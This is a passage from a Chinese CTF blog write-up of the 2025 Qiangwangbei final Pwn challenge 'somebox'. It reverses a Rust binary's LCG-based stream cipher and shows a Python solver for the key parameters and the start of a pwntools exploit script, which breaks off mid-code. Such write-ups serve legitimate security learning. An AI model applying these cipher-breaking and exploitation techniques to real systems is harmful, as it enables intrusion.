<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>强网杯S9决赛Pwn writeup | xia0ji233's blog</title><meta name="author" content="xia0ji233"><meta name="copyright" content="xia0ji233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本篇文章作个人复现 2025 强网杯决赛赛题的记录。">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯S9决赛Pwn writeup">
<meta property="og:url" content="https://xia0ji233.github.io/2025/11/26/qwb2025_final/index.html">
<meta property="og:site_name" content="xia0ji233&#39;s blog">
<meta property="og:description" content="本篇文章作个人复现 2025 强网杯决赛赛题的记录。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xia0ji233.github.io/img/avatar.png">
<meta property="article:published_time" content="2025-11-26T15:00:00.000Z">
<meta property="article:modified_time" content="2025-11-26T15:37:10.434Z">
<meta property="article:author" content="xia0ji233">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xia0ji233.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xia0ji233.github.io/2025/11/26/qwb2025_final/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '强网杯S9决赛Pwn writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-11-26 23:37:10'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="xia0ji233's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">310</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">92</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroud.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="xia0ji233's blog"><span class="site-name">xia0ji233's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">强网杯S9决赛Pwn writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-26T15:00:00.000Z" title="发表于 2025-11-26 23:00:00">2025-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-26T15:37:10.434Z" title="更新于 2025-11-26 23:37:10">2025-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/">比赛复盘</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS9%E5%86%B3%E8%B5%9B/">强网杯S9决赛</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS9%E5%86%B3%E8%B5%9B/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>29分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="强网杯S9决赛Pwn writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本篇文章作个人复现 2025 强网杯决赛赛题的记录。</p>
<span id="more"></span>

<h2 id="AWDU"><a href="#AWDU" class="headerlink" title="AWDU"></a>AWDU</h2><h3 id="somebox"><a href="#somebox" class="headerlink" title="somebox"></a>somebox</h3><p>这道题是 rust 的综合题，总体难度算很高的了，并要求选手掌握很深的逆向功底，密码学技术和 shellcode 编写技术。</p>
<img src="/2025/11/26/qwb2025_final/1.png" class="">

<p>上来一串加密的数据，让人看得一脸懵逼，只能开逆了，主逻辑在 <code>sub_1AB40</code> 中，通过字符串发现一个菜单</p>
<img src="/2025/11/26/qwb2025_final/2.png" class="">

<p>顺着这个 menu 字符串可以找到关键结构</p>
<img src="/2025/11/26/qwb2025_final/3.png" class="">

<p>很显然，<code>1FA20</code> 就是所谓的加密函数了。</p>
<img src="/2025/11/26/qwb2025_final/4.png" class="">

<p>很好，非常无敌的加密，猜测一下 a1 的结构，如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">encryptData</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 k[<span class="number">4</span>];</span><br><span class="line">    __int64 b[<span class="number">4</span>];</span><br><span class="line">    __int64 key[<span class="number">4</span>];</span><br><span class="line">    __int64 idx;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>根据加密的算法可以看出来，这是一个流式的加密，密钥递推符合如下公示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[n] = k * a[n-1] + b</span><br></pre></td></tr></table></figure>

<p>其中 <code>k</code> 和 <code>b</code> 是随机生成的，其中只有 <code>a[0]</code> 是已知的，也就是该结构体 <code>key</code> 的初始值。</p>
<img src="/2025/11/26/qwb2025_final/5.png" class="">

<p><code>v8</code> 对原文仅仅做了异或操作，而流式 <code>key</code> 保存在 <code>v6</code>，经过一系列的变化得到了 <code>v8</code>，在 <code>v6-&gt;v7</code> 和 <code>v7-&gt;v8</code> 的过程显然都是可逆的，那么只需要拿到异或得到的值，即可解出原 <code>key</code>。由于它四个 <code>key</code> 是轮转的，这就导致了开头的 32 字节加密是固定的，后续全部是随机。开头输出的菜单原文是已知的，也就是说，现在已知原文，密文，那么开头原文的一系列密钥是已知的，即说对于这四个数列 <code>key1[n],key2[n],key3[n],key4[n]</code>，可以知道它们的前几项。</p>
<p>我们又已知数列的递推公式均满足 <code>key[n] = (k * key[n-1] + b) mod pow(2,64) | (n&gt;=1)</code></p>
<p>经过逆向把这些信息总结出来之后，就是 call 队伍里的密码学师傅了，个人认为解释的非常清楚了.</p>
<img src="/2025/11/26/qwb2025_final/6.png" class="">

<p>密码学师傅非常给力，很快给了我脚本，根据前几项来推测 k 和 b 的值，尽管可能有多解，实测发现多解情况随便选一组解不影响加解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：已有的若干项（无符号 64 位，Python int 足够）</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">M = <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod64</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x &amp; (M - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解线性同余 k*dx ≡ dy (mod M)</span></span><br><span class="line"><span class="comment"># 返回候选 k 的列表（每个在 [0, M-1]）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_for_k</span>(<span class="params">dx, dy</span>):</span><br><span class="line">    dx = mod64(dx);</span><br><span class="line">    dy = mod64(dy)</span><br><span class="line">    <span class="keyword">if</span> dx == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 0 * k ≡ dy (mod M)  -&gt; 有解当且仅当 dy ≡ 0 (mod M)</span></span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>] <span class="keyword">if</span> dy == <span class="number">0</span> <span class="keyword">else</span> []  <span class="comment"># 特殊：dx==0 不约束 k，如果 dy==0 则任意 k 可，返回 placeholder</span></span><br><span class="line">    g = gcd(dx, M)</span><br><span class="line">    <span class="keyword">if</span> dy % g != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="comment"># 除以 g，在模 M&#x27; 下求逆</span></span><br><span class="line">    dxp = dx // g</span><br><span class="line">    dyp = dy // g</span><br><span class="line">    Mp = M // g</span><br><span class="line">    <span class="comment"># 计算 (dxp)^(-1) mod Mp</span></span><br><span class="line">    <span class="comment"># 使用扩展欧几里得或 pow since Mp 不是素数但 gcd(dxp, Mp)==1</span></span><br><span class="line">    inv = <span class="built_in">pow</span>(dxp, -<span class="number">1</span>, Mp)  <span class="comment"># Python 3.8+</span></span><br><span class="line">    k0 = (dyp * inv) % Mp</span><br><span class="line">    <span class="comment"># 所有解为 k0 + t*Mp, t=0..g-1</span></span><br><span class="line">    <span class="keyword">return</span> [(k0 + t * Mp) % M <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(g)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_k_b_from_sequence</span>(<span class="params">seq</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 信息太少（任意 k,b 可）</span></span><br><span class="line">    <span class="comment"># 尝试用第一个能约束的相邻三项（或多处）来生成候选 k</span></span><br><span class="line">    candidates = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">2</span>):</span><br><span class="line">        dx = (seq[i + <span class="number">1</span>] - seq[i]) % M</span><br><span class="line">        dy = (seq[i + <span class="number">2</span>] - seq[i + <span class="number">1</span>]) % M</span><br><span class="line">        ks = solve_for_k(dx, dy)</span><br><span class="line">        <span class="keyword">if</span> ks == []:</span><br><span class="line">            <span class="keyword">return</span> []  <span class="comment"># 在此处无解 -&gt; 整个序列不可能来自同一线性映射</span></span><br><span class="line">        <span class="comment"># 若 dx==0 且 dy==0 意味着这三项对 k 不产生约束，继续找下一组</span></span><br><span class="line">        <span class="keyword">if</span> dx == <span class="number">0</span> <span class="keyword">and</span> dy == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 否则 ks 为候选集合（注意：若 dx==0 and dy==0 we skipped）</span></span><br><span class="line">        candidates = ks</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果一直没有约束（全部相等或每组三项都 dx==0,dy==0），处理特殊情形</span></span><br><span class="line">    <span class="keyword">if</span> candidates <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 所有相邻差都为0 =&gt; seq 都相同 =&gt; (k-1)*c + b ≡ 0 (mod M),无限多解</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ALL_EQUAL&quot;</span>  <span class="comment"># 提示无限多解（或需要更多约束）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证候选，保留能让所有已知项成立的那些</span></span><br><span class="line">    valid = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> candidates:</span><br><span class="line">        b = (seq[<span class="number">1</span>] - (k * seq[<span class="number">0</span>])) % M</span><br><span class="line">        ok = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> ((k * seq[i] + b) - seq[i + <span class="number">1</span>]) % M != <span class="number">0</span>:</span><br><span class="line">                ok = <span class="literal">False</span>;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            valid.append((k, b))</span><br><span class="line">    <span class="keyword">return</span> valid</span><br></pre></td></tr></table></figure>

<p>把这个脚本保存为 <code>m.py</code>，可以构造交互了，因为系统会将用户输入的 <code>hex</code> 也加密一遍之后去理解含义，所以输入的时候需要进行一次加密（这个流加密可以验证加密和解密都能使用同一个函数），但是它们共享密钥生成器，所以这里需要做好分配。</p>
<p>初始密钥直接断函数看栈数据就行。</p>
<img src="/2025/11/26/qwb2025_final/7.png" class="">

<p>下面是交互脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> m <span class="keyword">import</span> find_k_b_from_sequence</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror64</span>(<span class="params">value, shift, bits=<span class="number">64</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;64位循环右移 - rol64的逆操作&quot;&quot;&quot;</span></span><br><span class="line">    shift %= bits</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (bits - shift))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol64</span>(<span class="params">value, shift, bits=<span class="number">64</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;64位循环左移&quot;&quot;&quot;</span></span><br><span class="line">    shift %= bits</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) | (value &gt;&gt; (bits - shift))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix</span>(<span class="params">v6</span>):</span><br><span class="line">    v7 = v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>) ^ (</span><br><span class="line">                (v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>)) &gt;&gt; <span class="number">8</span>) ^ (</span><br><span class="line">                     (v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>) ^ ((</span><br><span class="line">                                                                                                                                  v6 ^ (</span><br><span class="line">                                                                                                                                      v6 &gt;&gt; <span class="number">1</span>) ^ (</span><br><span class="line">                                                                                                                                              (</span><br><span class="line">                                                                                                                                                          v6 ^ (</span><br><span class="line">                                                                                                                                                              v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ (</span><br><span class="line">                                                                                                                                              (</span><br><span class="line">                                                                                                                                                          v6 ^ (</span><br><span class="line">                                                                                                                                                              v6 &gt;&gt; <span class="number">1</span>) ^ (</span><br><span class="line">                                                                                                                                                                      (</span><br><span class="line">                                                                                                                                                                                  v6 ^ (</span><br><span class="line">                                                                                                                                                                                      v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>)) &gt;&gt; <span class="number">8</span>)) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    v7 = v7 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    v7h = v7 &gt;&gt; <span class="number">32</span></span><br><span class="line">    v8 = rol64(v7 ^ v7h, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> v8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_xor_shift</span>(<span class="params">y, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逆异或变换：从 y 恢复 x，满足 y = x ^ (x &gt;&gt; k)&quot;&quot;&quot;</span></span><br><span class="line">    x = y</span><br><span class="line">    shift = k</span><br><span class="line">    <span class="keyword">while</span> shift &lt; <span class="number">64</span>:</span><br><span class="line">        x = x ^ (x &gt;&gt; shift)</span><br><span class="line">        shift *= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_mix</span>(<span class="params">v8</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;mix 函数的逆向算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 步骤1: 循环右移7位得到 u</span></span><br><span class="line">    u = ror64(v8, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 